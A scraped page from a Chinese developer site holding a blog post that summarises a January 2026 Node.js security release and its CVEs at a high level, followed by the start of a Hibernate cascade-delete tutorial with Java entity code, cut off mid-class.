h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>Node.js 官方在 2026 年 1 月 13 日更新修复了多个严重安全漏洞，涉及缓冲区泄露、权限绕过、DoS 攻击等，影响所有活跃版本，建议所有用户尽快升级！</p>
<h4 data-id="heading-1">往期精彩推荐</h4>
<ul>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578">AudioDock：服务器和 NAS 音频播放最棒的软件！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo 才是 AI 协同开发的最佳方案！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">尤雨溪强烈推荐的这个库你一定要知道 ⚡️⚡️⚡️</a></li>
<li>更多精彩文章欢迎关注我的公众号：萌萌哒草头将军</li>
</ul>
<h3 data-id="heading-2">正文</h3>
<p>本次安全发布主要针对 Node.js 当前所有活跃版本（20.x、22.x、24.x、25.x）发布了补丁，累计修复了 <strong>3 个 高危</strong>、<strong>4 个 中危</strong> 和 <strong>1 个 低危</strong> 严重性的漏洞，</p>
<p>同时更新了核心依赖 c-ares 和 undici。</p>
<h4 data-id="heading-3">主要高危漏洞：</h4>
<ol>
<li><strong>CVE-2025-55131</strong>（High）</li>
</ol>
<p>Timeout 导致的竞态条件，使得 Buffer.alloc / Uint8Array 可能分配到未清零的内存，存在敏感信息泄露风险（密钥、token 等）。需要特定时机或攻击者控制超时行为才能利用，但危害极大。</p>
<ol start="2">
<li><strong>CVE-2025-55130</strong>（High）</li>
</ol>
<p>使用精心构造的相对路径符号链接，可绕过 <code>--allow-fs-read</code> / <code>--allow-fs-write</code> 权限限制，实现任意文件读写。严重破坏了 Permission Model 的隔离能力。</p>
<ol start="3">
<li><strong>CVE-2025-59465</strong>（High）</li>
</ol>
<p>HTTP/2 服务器在收到畸形 HEADERS 帧时会直接抛出未处理的 TLSSocket 错误，导致进程崩溃（远程 DoS）。未加 error 监听的 HTTPS 服务尤其危险。</p>
<h4 data-id="heading-4">中危漏洞：</h4>
<ul>
<li><strong>CVE-2026-21636</strong>（Medium）：</li>
</ul>
<p>权限模型下 Unix Domain Socket 未受 <code>--allow-net</code> 限制，可连接任意本地 socket，存在提权风险（仅影响 v25）</p>
<ul>
<li><strong>CVE-2025-59466</strong>（Medium）：</li>
</ul>
<p>async_hooks 场景下栈溢出错误无法被捕获，直接终止进程（DoS）</p>
<ul>
<li><strong>CVE-2026-21637</strong>（Medium）：</li>
</ul>
<p>TLS PSK/ALPN 回调中同步异常会绕过错误处理，导致崩溃或 fd 泄漏</p>
<h4 data-id="heading-5">低危漏洞</h4>
<ul>
<li><strong>CVE-2025-55132</strong>（Low）：</li>
</ul>
<p>fs.futimes() 可绕过只读权限修改文件时间戳（痕迹清理）。</p>
<p><strong>受影响版本</strong>：所有活跃分支 20.x、22.x、24.x、25.x（EOL 版本同样受影响，但官方不再修复）<br/>
<strong>修复版本</strong>：2025 年 12 月 15 日之后发布的最新 20.x / 22.x / 24.x / 25.x 版本</p>
<h3 data-id="heading-6">最后</h3>
<p>强烈建议生产环境尽快升级到最新版本，同时关注后续的 async_hooks DoS 缓解方案。</p>
<p>今天的分享就这些了，感谢大家的阅读，如果文章中存在错误的地方欢迎指正！</p>
<h4 data-id="heading-7">往期精彩推荐</h4>
<ul>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578">AudioDock：服务器和 NAS 音频播放最棒的软件！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo 才是 AI 协同开发的最佳方案！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">尤雨溪强烈推荐的这个库你一定要知道 ⚡️⚡️⚡️</a></li>
<li>更多精彩文章欢迎关注我的公众号：萌萌哒草头将军</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（43）Hibernate中的级联删除如何实现？]]></title>    <link>https://juejin.cn/post/7595178023256899603</link>    <guid>https://juejin.cn/post/7595178023256899603</guid>    <pubDate>2026-01-15T11:46:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595178023256899603" data-draft-id="7595150851477815339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（43）Hibernate中的级联删除如何实现？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T11:46:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（43）Hibernate中的级联删除如何实现？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:46:17.000Z" title="Thu Jan 15 2026 11:46:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，级联删除（Cascade Delete）是指当删除一个实体时，自动删除与之相关联的其他实体。Hibernate通过配置级联类型来实现这一功能。常用的级联类型包括：</p>
<ul>
<li><code>CascadeType.ALL</code>：对所有操作进行级联（包括<code>PERSIST</code>、<code>MERGE</code>、<code>REMOVE</code>等）。</li>
<li><code>CascadeType.REMOVE</code>：级联删除操作。</li>
<li><code>CascadeType.PERSIST</code>：级联保存操作。</li>
<li><code>CascadeType.MERGE</code>：级联合并操作。</li>
<li><code>CascadeType.REFRESH</code>：级联刷新操作。</li>
<li><code>CascadeType.DETACH</code>：级联分离操作。</li>
</ul>
<p>以下是一个详细的示例，展示如何在Hibernate中实现级联删除。</p>
<h3 data-id="heading-0">示例</h3>
<p>假设我们有两个实体类：<code>Category</code>和<code>Product</code>，其中<code>Category</code>和<code>Product</code>是一对多关系。当我们删除一个<code>Category</code>时，自动删除与之关联的所有<code>Product</code>。</p>
<h4 data-id="heading-1">步骤一：定义实体类</h4>
<h5 data-id="heading-2"><code>Category</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

